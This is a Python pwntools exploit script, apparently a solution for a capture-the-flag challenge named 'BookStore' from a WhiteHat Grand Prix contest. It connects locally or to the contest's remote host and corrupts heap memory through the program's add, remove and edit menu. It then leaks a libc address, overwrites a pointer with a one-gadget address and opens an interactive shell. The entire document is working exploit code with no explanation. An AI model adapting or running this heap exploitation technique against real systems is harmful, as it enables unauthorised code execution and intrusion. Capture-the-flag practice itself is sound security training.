from pwn import *
import sys, time
#context(log_level='debug')

b = ELF("./BookStore")
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(title, size, brief, refer, yn):
	p.sendlineafter("choice:", "1")
	p.sendafter(":", title)
	p.sendlineafter(":", str(size))
	p.sendafter(":", brief)
	p.sendafter(":", refer)
	p.sendlineafter(")", yn)
	print "added"

def edit(otitle, title, size, brief, yn):
	p.sendlineafter("choice:", "2")
        p.sendafter(":", otitle)
        p.sendafter(":", title)
        p.sendlineafter(":", str(size))
        p.sendafter(":", brief)
        p.sendlineafter(")", yn)
	print "edited"

def rm(title):
	p.sendlineafter("choice:", "3")
	p.sendlineafter("Title:", title)
	print "removed"

def show():
	p.sendlineafter("choice:", "4")

if len(sys.argv) == 1:
	p = process("./BookStore")#, env={"LD_PRELOAD":"./libc-2.27.so"})
else:
	p = remote("pwn02.grandprix.whitehatvn.com", 8005)

add("0\n", 32, "aaaa\n", "0\n", "Y")
rm("0")
edit("0\n", "0\n", 32, "aaaa\n", "Y")
edit("0\n", "0\n", 32, "aaaa\n", "Y")

payload = p64(0) + p64(0x6021C0)
payload += "a"*32
payload += "\x00"*2
payload += p64(0x400c4a)
edit("0\n", "0\n", 0x40, payload+"\n", "N")

show()
p.recvuntil("a"*32)
leak = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc = leak - 0x3ec760
log.info("leak = 0x%x" % leak)
log.info("libc = 0x%x" % libc)

rm("a"*32)

add("0\n", 0x30, "/bin/sh\x00\n", "0\n", "Y")
rm("0")
edit("0\n", "0\n", 0x30, "/bin/sh\x00\n", "Y")
edit("0\n", "0\n", 0x30, "/bin/sh\x00\n", "Y")

payload = p64(0) + p64(0x6021C0)
payload += "a"*32
payload += "\x00"*2
payload += p64(libc + 0x10a38c)#l.symbols['system'])
edit("0\n", "0\n", 0x40, payload+"\n", "N")
p.sendlineafter("choice:", "4")
p.interactive()
